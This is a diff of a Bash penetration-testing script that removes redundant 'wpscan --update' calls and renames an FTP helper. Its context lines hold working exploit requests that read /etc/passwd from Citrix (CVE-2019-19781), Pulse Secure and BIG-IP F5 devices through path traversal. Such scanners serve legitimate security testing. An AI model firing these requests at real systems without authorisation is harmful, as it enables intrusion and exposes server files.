@@ -2041,8 +2041,7 @@ then
 							#######  citrix (domain) ######
 							grep -qi citrix .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
+							if [[ $greprc -eq 0 ]];then 								
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($subdominio)"
 								
 								CVE-2019-19781.sh $subdominio $port "cat /etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
@@ -2054,8 +2053,7 @@ then
 							#######  Pulse secure (domain) ######
 							grep -qi pulse .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
+							if [[ $greprc -eq 0 ]];then 								
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($subdominio)"
 								
 								curl --path-as-is -s -k "http://$subdominio/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
@@ -2069,7 +2067,6 @@ then
 							grep -qi Outlook .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
 							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($subdominio)"
 								
 								owa.pl -host $subdominio -port $port  > logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
@@ -2201,7 +2198,6 @@ then
 					grep -qi citrix .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
 					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($ip)"
 							
 						CVE-2019-19781.sh $ip $port "cat /etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt
@@ -2215,7 +2211,6 @@ then
 					grep -qi pulse .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
 					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($ip)"
 						
 						curl --path-as-is -s -k "http://$ip/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt
@@ -2229,7 +2224,6 @@ then
 					grep -qi Outlook .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
 					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($ip)"
 						
 						owa.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt
@@ -2717,7 +2711,6 @@ then
 							grep -qi citrix .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
 							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($subdominio)"
 							
 								CVE-2019-19781.sh $subdominio $port "cat /etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
@@ -2731,7 +2724,6 @@ then
 							grep -qi pulse .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
 							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($subdominio)"
 								
 								curl --path-as-is -s -k "https://$subdominio/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
@@ -2745,7 +2737,6 @@ then
 							grep -qi "BIG-IP" .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
 							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($subdominio)"
 								
 								curl --path-as-is -s -k "https://$subdominio/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt
@@ -2758,8 +2749,7 @@ then
 							#######  OWA (domain) ######
 							grep -qi Outlook .enumeracion/"$subdominio"_"$port"_webData.txt
 							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update >/dev/null 						
+							if [[ $greprc -eq 0 ]];then 														
 								echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($subdominio)"
 								
 								owa.pl -host $subdominio -port $port  > logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
@@ -2907,8 +2897,7 @@ then
 					#######  citrix (ip) ######
 					grep -qi citrix .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
+					if [[ $greprc -eq 0 ]];then 													
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($ip)"
 							
 						CVE-2019-19781.sh $ip $port "cat /etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt
@@ -2920,8 +2909,7 @@ then
 					#######  Pulse secure (ip) ######
 					grep -qi pulse .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
+					if [[ $greprc -eq 0 ]];then 													
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($ip)"
 							
 						curl --path-as-is -s -k "https://$ip/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt
@@ -2934,8 +2922,7 @@ then
 					#######  BIG-IP F5 (domain) ######
 					grep -qi "BIG-IP" .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
+					if [[ $greprc -eq 0 ]];then 								 					
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($ip)"
 						
 						curl --path-as-is -s -k "https://$ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_bigIPVul.txt
@@ -2948,8 +2935,7 @@ then
 					#######  OWA (ip) ######
 					grep -qi Outlook .enumeracion/"$ip"_"$port"_webData.txt
 					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						wpscan  --update >/dev/null 						
+					if [[ $greprc -eq 0 ]];then 													
 						echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($ip)"
 						
 						owa.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt
@@ -3368,7 +3354,7 @@ then
 			else							
 				echo -e "\t[+] Comprobando usuario anonymous"
 				echo "ftp_anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt" > logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt 2>/dev/null 
-				ftp_anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt >> logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt 2>/dev/null 
+				ftp-anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt >> logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt 2>/dev/null 
 				grep "Listado de directorio" logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt > .vulnerabilidades/"$ip"_21_ftpAnonymous.txt
 				sleep 5
 			fi
